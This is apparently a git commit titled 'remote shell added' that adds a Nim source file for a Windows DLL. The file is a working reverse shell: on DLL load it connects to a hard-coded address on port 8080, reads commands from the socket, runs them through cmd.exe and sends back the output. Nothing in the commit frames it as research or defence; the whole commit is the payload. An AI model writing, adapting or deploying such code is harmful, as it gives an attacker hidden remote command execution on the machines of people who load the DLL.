8d148b7eaad73866877b9df4e2c7d8b74e45f5dd
mudasirshah434 <mudasirshah9777@gmail.com>
2025-02-16 12:18:57 +0500

    remote shell added

---
+++ shell.nim
@@ -0,0 +1,32 @@
+import winim/lean
+import net, osproc, std/strformat
+
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDll: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
+    NimMain()
+
+    if fdwReason == DLL_PROCESS_ATTACH:
+        # Variables
+        let
+            ip = "192.168.1.26"
+            port = 8080
+            sock = newSocket()
+            prompt = "Noir's Shell $ "
+
+        # Connection
+        sock.connect(ip, Port(port))
+
+        # Loop remote shell
+        while true:
+            send(sock, prompt)
+            let args = recvLine(sock)
+
+            # Execute
+            try:
+                let cmd = execProcess(fmt"cmd.exe /c " & args, options={poUsePath})
+                send(sock, cmd)
+            except:
+                break
+
+    return true
